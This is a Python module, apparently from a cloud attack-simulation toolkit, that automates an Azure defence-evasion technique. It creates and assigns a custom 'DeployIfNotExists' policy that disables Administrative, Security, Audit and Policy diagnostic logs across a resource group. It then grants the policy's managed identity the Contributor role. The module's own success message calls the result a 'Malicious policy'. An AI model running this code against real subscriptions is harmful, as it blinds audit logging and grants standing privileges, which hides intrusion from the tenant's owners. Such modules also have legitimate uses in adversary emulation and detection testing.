'''
Module Name : Azure_Policy_Exploitation
Module Description : Exploits the 'DeployIfNotExists' Azure policy effect to automatically disable diagnostic settings across resources in a resource group.
'''

from azure.mgmt.resource import PolicyClient
from azure.mgmt.authorization import AuthorizationManagementClient
from core.AzureFunctions import GetAzureAuthCredential, GetCurrentSubscriptionAccessInfo
import uuid

def TechniqueMain(subscription_id, resource_group_name, location, policy_definition_name="DisableDiagnosticSettingsPolicy"):

    if resource_group_name in ["", None]:
        return False, {"Error": "Invalid input: Resource Group Name required"}, None
    
    if subscription_id in ["", None]:
        current_sub_info = GetCurrentSubscriptionAccessInfo()
        subscription_id = current_sub_info.get("id")

    try:
        credential = GetAzureAuthCredential()
        policy_client = PolicyClient(credential, subscription_id)
        auth_client = AuthorizationManagementClient(credential, subscription_id)
        
        policy_definition = {
            "properties": {
                "displayName": "DeployIfNotExists - Disable Diagnostic Settings",
                "policyType": "Custom",
                "mode": "All",
                "metadata": {
                    "category": "Security"
                },
                "parameters": {},
                "policyRule": {
                    "if": {
                        "field": "type",
                        "equals": "Microsoft.Resources/resourceGroups"
                    },
                    "then": {
                        "effect": "DeployIfNotExists",
                        "details": {
                            "type": "Microsoft.Insights/diagnosticSettings",
                            "deploymentScope": "ResourceGroup",
                            "existenceScope": "ResourceGroup",
                            "existenceCondition": {
                                "allof": [
                                    {
                                        "field": "Microsoft.Insights/diagnosticSettings/logs.enabled",
                                        "equals": False
                                    }
                                ]
                            },
                            "deployment": {
                                "properties": {
                                    "mode": "incremental",
                                    "template": {
                                        "$schema": "https://schema.management.azure.com/schemas/2019-04-01/deploymentTemplate.json#",
                                        "contentVersion": "1.0.0.0",
                                        "resources": [
                                            {
                                                "type": "Microsoft.Insights/diagnosticSettings",
                                                "apiVersion": "2017-05-01-preview",
                                                "name": "[concat(parameters('resourceId'), '/disableDiagnosticSettings')]",
                                                "location": "global",
                                                "properties": {
                                                    "workspaceId": "fakeWorkspaceId",
                                                    "logs": [
                                                        {
                                                            "category": "Administrative",
                                                            "enabled": False
                                                        },
                                                        {
                                                            "category": "Security",
                                                            "enabled": False
                                                        },
                                                        {
                                                            "category": "Audit",
                                                            "enabled": False
                                                        },
                                                        {
                                                            "category": "Policy",
                                                            "enabled": False
                                                        }
                                                    ]
                                                }
                                            }
                                        ]
                                    }
                                }
                            }
                        }
                    }
                }
            }
        }

        policy_definition_result = policy_client.policy_definitions.create_or_update(
            policy_definition_name,
            policy_definition
        )

        print(f"Policy Definition '{policy_definition_result.name}' created.")

        policy_assignment_name = "DisableDiagnosticSettingsPolicyAssignment"

        policy_assignment = policy_client.policy_assignments.create(
        scope=f"/subscriptions/{subscription_id}/resourceGroups/{resource_group_name}",
        policy_assignment_name=policy_assignment_name,
        parameters={
            "policy_definition_id": policy_definition_result.id,
            "display_name": "Disable Diagnostic Settings Policy Assignment",
            "identity": {
            "type": "SystemAssigned"
            },
            "location": location
        })
      
        print(f"Policy '{policy_assignment.name}' assigned to resource group '{resource_group_name}'.")

        role_assignment_name = str(uuid.uuid4())
        role_assignment_params = {
            "role_definition_id": f"/subscriptions/{subscription_id}/providers/Microsoft.Authorization/roleDefinitions/b24988ac-6180-42a0-ab88-20f7382dd24c",
            "principal_id": policy_assignment.identity.principal_id
        }

        role_assignment = auth_client.role_assignments.create(
            scope=f"/subscriptions/{subscription_id}/resourceGroups/{resource_group_name}",
            role_assignment_name=role_assignment_name,
            parameters=role_assignment_params
        )

        pretty_response = {
            "Success": {
                "message": f"Malicious policy created and assigned, disabling diagnostic settings in resource group '{resource_group_name}', with Contributor role attached.",
            }
        }
        return True, role_assignment, pretty_response

    except Exception as e:
        return False, {"Error": str(e)}, None

def TechniqueInputSrc() -> list:
    '''Returns the input fields required as parameters for the technique execution'''
    return [
        {
            "title": "Subscription ID (Optional)",
            "id": "subscription-id-text-input",
            "type": "text",
            "placeholder": "1234-5678-9098-7654-3210",
            "element_type": "dcc.Input"
        },
        {
            "title": "Resource Group Name", 
            "id": "resource-group-name",
            "type": "text",
            "placeholder": "example-resource-group",
            "element_type": "dcc.Input"
        },
        {
            "title": "Location",
            "id": "location",
            "type": "text",
            "placeholder": "eastus",
            "element_type": "dcc.Input"
        },
        {
            "title": "Policy Definition Name (Optional)", 
            "id": "policy-definition-name",
            "type": "text",
            "placeholder": "DisableDiagnosticSettingsPolicy",
            "element_type": "dcc.Input"
        }
    ]
